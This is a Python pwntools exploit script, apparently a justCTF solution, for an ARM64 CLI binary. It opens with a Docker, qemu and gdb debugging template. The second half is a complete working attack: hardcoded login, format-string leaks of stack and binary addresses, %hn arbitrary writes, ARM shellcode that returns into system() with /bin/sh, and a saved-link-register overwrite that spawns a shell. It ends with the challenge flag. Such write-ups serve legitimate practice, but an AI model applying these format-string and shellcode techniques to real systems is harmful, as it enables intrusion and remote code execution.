
#==========================   Description  ==========================
# A custom template for binary exploitation of ARM binaries on x86 hosts, that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE
#==========================    Arguments   ==========================
# Arguments:
#
# DEBUG        - Enables debugging output
# GDB          - Spawns the target binary with gdb support.
# NOASLR       - Disables ASLR (Note: ASLR might not really be enabled at all by default)
# REMOTE       - Runs the exploit against the remote
#==========================  Known Issues  ==========================
# 1. (gdb) `info proc maps` command does not work with qemu-user and gdb-multiarch. 
#    See https://patchwork.ozlabs.org/project/qemu-devel/patch/20220221030910.3203063-1-dominik.b.czarnota@gmail.com/
#    To get base address, use `info auxv` and check the AT_ENTRY, or do something similar.
#    To get stack area, just check $sp
#    Do not trust any mappings shown in /proc/self/maps of qemu-aarch64
#
# 2. You cannot send SIGINT via the gdb window. (CTRL+C does not work). 
#    `kill` also has unstable behavior and you send it to qemu-aarch64, not the binary.
#    (e.g. target is blocking in a read() and you send a SIGINT, which causes read to return prematurely with -1, which the target does not handle well)
#    (e.g. you may be able to deliver only one SIGINT per run)
#========================== Design Choices ==========================
# (-) for drawback, (+) for advantage
#
# We could have ran `gdb-multiarch` inside the container.
#  - We would have to create yet again our exploit development environment.
#  - `-ex 'set sysroot  target:/usr/{context.arch}-linux-gnu'` This does not work (not implemented file transfer command)
#  + Only the container has the correct glibc version
#
# So we will combine both worlds: We will copy the remote sysroot via docker cmd to our host and use it.
#
# In Dockerfile, use image "FROM arm64v8/ubuntu" or "FROM ubuntu" (i.e x86-64)?
#  * arm64v8/ubuntu:
#   + Has the correct libraries (e.g. aarch64 libc) and their correct version
#   - It invokes everything with `qemu-aarch64-static` and in order to debug the binary we also have to invoke `qemu-aarch`.
#     So, we end up with: `qemu-aarch64-static qemu-aarch64 -g 7778 /pwn/cli` which may be expensive
#  * ubuntu:
#    + Should be much faster as it does not emulate qemu-aarch64. (i.e. we end up with: `qemu-aarch64 -g 7778 /pwn/cli`)
# 
# Again, we will combine both worlds by supporting both "arm64v8/ubuntu" and "ubuntu"
# "arm64v8/ubuntu" can be used for binaries that depend on many shared libraries or depend more on ARM related stuff
# "ubuntu" can be used with dynamically linked binaries that only depend on ld.so or static binaries


from pathlib import Path
from typing import Optional
from pwn import *
import tempfile
import subprocess
import shlex
import os

GDB_PORT=7778
SOCAT_PORT=12345

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./cli')          # FIXME: CHANGE ME

gdbscript = '''
# init-gef
printf "Hello World!\\n"

# Verify that libraries and dynamically linked ELF have been loaded correctly:
# info sharedlibrary
# info file

# Get base address of binary by running the following command and checking AT_PHDR or AT_ENTRY
# info auxv

# b main
# continue
'''.format(**locals())

if args.REMOTE:
    remote_server = 'arm.nc.jctf.pro'           # FIXME: CHANGE ME
    remote_port = 5002                          # FIXME: CHANGE ME
    io = remote(remote_server, remote_port)
else:
    arguments = [] # Any required argv[] for the target binary # FIXME: CHANGE ME

    # Choose docker image. Valid values are:
    # [cli_minimal_native, cli_minimal_aarch64]
    docker_image   = "cli_minimal_aarch64"      # FIXME: CHANGE ME
    container_ip   = '127.0.0.1'                # FIXME: CHANGE ME
    container_name = docker_image + "_1"
    
    tmpdir = tempfile.TemporaryDirectory(prefix='pwn_')
    log.debug("Using temporary directory: " + tmpdir.name)

    def get_container_id() -> Optional[str]:
        p=subprocess.run(shlex.split(f"docker ps -aq --filter='name={container_name}'"), 
            stdout=subprocess.PIPE, check=True
        )
        id=p.stdout.decode('ascii').strip()
        return id if len(id) > 0 else None
    
    def _container_cp(src: str, dst: str, follow_links=True) -> None:
        cmd = ['docker', 'cp']
        if follow_links:
            cmd += ['-L']
        cmd += [src, dst]
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL)
    def cp_from_container(src: str, dst: str, follow_links=True) -> None:
        return _container_cp(f"{container_name}:{src}", dst, follow_links)

    def exit_handler() -> None:
        print('Cleaning up')
        id=get_container_id()
        if id:
            subprocess.run(shlex.split(f"docker kill {id}"), check=True, stdout=subprocess.DEVNULL)
        tmpdir.cleanup()

    def start(argv=[], *a, **kw):
        '''Start the target.'''
        cmd_str = f"docker run --rm -i -p {SOCAT_PORT}:{SOCAT_PORT} -p {GDB_PORT}:{GDB_PORT} --name {container_name} {docker_image}"
        cmd = shlex.split(cmd_str)
        if args.GDB:
            cmd += ['--GDB']
        if not context.aslr: # unset by NOASLR argument
            cmd += ['--NOASLR']
        cmd += [f"/pwn/{os.path.basename(elfexe.path)}"] + argv

        log.debug("Running binary command: {}".format(cmd))
        target = process(cmd, aslr=1)

        log.debug("Waiting for container to start...")
        while not get_container_id():
            time.sleep(1)
        log.debug("Container started!")

        target.recvline_startswith(b"WARNING: The requested image's platform", timeout=1) # docker garbage
        return target
    
    # Check for any previous container and remove it
    id=get_container_id()
    if id:
        log.debug("Removing previous container: " + id)
        subprocess.run(shlex.split(f"docker rm --force {id}"), check=True, stdout=subprocess.DEVNULL)
    
    io = start(arguments) # target started
    atexit.register(exit_handler)

    if args.GDB:
        if not gdbscript.endswith('\n'):
            gdbscript += '\n'

        # Create gdb file
        gdbscript_file = tempfile.NamedTemporaryFile(prefix='gdbscript_', suffix='.gdb', delete=False, dir=tmpdir.name, mode = 'w+')
        log.debug('Writing gdb script to %r\n%s', gdbscript_file.name, gdbscript)

        gdbscript_file.write(gdbscript)
        gdbscript_file.close()

        if elfexe.elftype != 'EXEC': # e.g. 'DYN'
            # Create sysroot from .so files copied from inside the container
            docker_arch=subprocess.run(shlex.split(f"docker exec -i {container_name} uname -m"),
                check=True, stdout=subprocess.PIPE
            ).stdout.decode('ascii').strip()

            sysroot_dir = tmpdir.name + "/sysroot"
            if docker_arch == context.arch: # docker is the same architecture as the binary
                Path(sysroot_dir + "/lib").mkdir(parents=True)
                cp_from_container(f"/lib/{context.arch}-linux-gnu"    , f"{sysroot_dir}/lib")
                cp_from_container(f"/lib/ld-linux-{context.arch}.so.1", f"{sysroot_dir}/lib")
            else:
                cp_from_container(f"/usr/{context.arch}-linux-gnu", sysroot_dir) # hack: will create sysroot_dir with the given contents
            sysroot_args = f"-iex 'set sysroot {sysroot_dir}'"
        else:
            sysroot_args=''

        gdb_multiarch = 'gdb-multiarch'
        assert(pwnlib.util.misc.which(gdb_multiarch))

        cmd_str = f"{gdb_multiarch} -q -iex 'set architecture {context.arch}' {sysroot_args} -iex 'file {elfexe.path}' -ex 'target remote {container_ip}:{GDB_PORT}' -x {gdbscript_file.name}"
        cmd = shlex.split(cmd_str)
        log.debug("Running gdb command: {}".format(cmd))
        pwnlib.util.misc.run_in_new_terminal(cmd) # launches gdb (by splitting tmux terminal or in a new terminal window)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# io.interactive()

io.recvuntil(b'login: ')
io.sendline(b'admin')
io.recvuntil(b'password: ')
io.sendline(b'admin1')
io.recvuntil(b'> ')

io.interactive()

def send_cmd(cmd):
    io.sendline(cmd)
    data = io.recvuntil(b'> ', drop=True)
    return data

def leak(N):
    data = send_cmd(b'echo '+ b'0x%016lx '*N)
    return data.decode('ascii').strip().split()
def leak_offset(offset):
    s = '0x%{}$016lx'.format(offset)
    data = send_cmd(b'echo '+ bytes(s, encoding='utf-8'))
    return data.decode('ascii').strip().split()[0]

BAD_BYTES = [0x0a, 0x00, 0x1b, 0xa8, 0x13] # these terminate the input

send_cmd(b'mode advanced')
data = leak(1)[0] # Leaks a stack address
# print(data)
stack_top = int(data, 16) - 0x2d # top valid stack address for the function's  cli() stack frame
log.info(f"Stack top: {hex(stack_top)}")

data = leak_offset(9)
LR = int(data, 16)
base__addr = LR - 0xda8
log.info(f"Base address: {hex(base__addr)}") # binary's base address

system__addr = base__addr + 0x8c0 # system@plt

system_ptr__addr  = stack_top +  0x20   # address where we will store the address of system()
cmd__addr         = stack_top +  0x28   # cmd buffer in cli()
vuln_buffer__addr = stack_top + 0x128   # vuln_buffer in cli()


shellcode__addr         = vuln_buffer__addr + 0x18 # shellcode address (inside vuln_buffer)
format_write_addr__addr = vuln_buffer__addr + 0xd8 # Memory used in the %n format string exploit. The contents of this memory contain the write_addr. It is nice to use since this memory is initialized to 0x0000000000000000

log.info(f"system address    : {hex(system__addr)}")
log.info(f"system ptr address: {hex(system_ptr__addr)}")
log.info(f"Shellcode address : {hex(shellcode__addr)}")
log.info(f"Address that holds write_addr for %n exploit: {hex(format_write_addr__addr)}")

def arbitrary_write_16(write_addr, write_value):
    assert(write_value >=0 and write_value < (1<<16))
    log.debug(f"Writing value {hex(write_value)} (16-bytes) in address {hex(write_addr)}")

    write_addr_packed = p64(write_addr)

    # Remove trailing '\x00' as they are bad bytes. We keep only 1 in the end.
    assert(write_addr_packed.endswith(b'\x00'))
    while write_addr_packed.endswith(b'\x00'):
        write_addr_packed = write_addr_packed[:-1]
    for bb in BAD_BYTES:
        if bb in write_addr_packed:
            log.error(f'Found bad byte: {hex(bb)} in address: {hex(write_addr)}')
            assert(False)
    io.send(b'echo ' + b'A'*0xd8 + write_addr_packed + b'\x00') # place the write_addr in vuln_buffer__addr+0xd8 as in that offset there are a bunch of zeros
    io.recvuntil(b'> ')

    send_cmd(b'mode advanced') # the previous echo overwrote the mode
    payload  = 'echo '
    if write_value>=11: # -4294967295 (aka maximum value printable by %d)
        payload += '%' + str(write_value) + 'd'
    else:
        payload += 'Q'*write_value
    payload += '%72$hn' # At offset 72 our write_addr is located
    send_cmd(bytes(payload, encoding='utf-8'))

def arbitrary_write_64(write_addr, write_value):
    for i in range(0,8,2):
        addr_16 = write_addr + i
        val_16 = (write_value >> (i*8)) & 0xFFFF
        arbitrary_write_16(addr_16, val_16)

arbitrary_write_64(system_ptr__addr, system__addr)

shellcode = asm('''
/* X0  points to /bin/sh stored inside the cmd buffer */
/* X30 (link register) points to system() */
sub X0 , sp, #0x170
sub X1 , sp, #0x178
ldr X30, [X1, #-0x08]
ret
''')
for bb in BAD_BYTES:
    if bb in shellcode:
        log.error(f'Found bad byte {hex(bb)} in shellcode')
        assert(False)

send_cmd(b'echo ' + b'A'*0x18 + shellcode + b'B'*0x48 + p64(shellcode__addr)) # last 8 bytes overwrite LR stored in stack to return from main()
io.send(b'exit AAA' + b'/bin/sh\x00') # break from while(1) loop.

io.interactive()
io.close()

# Flag: justCTF{pwn_the_lawn!1}
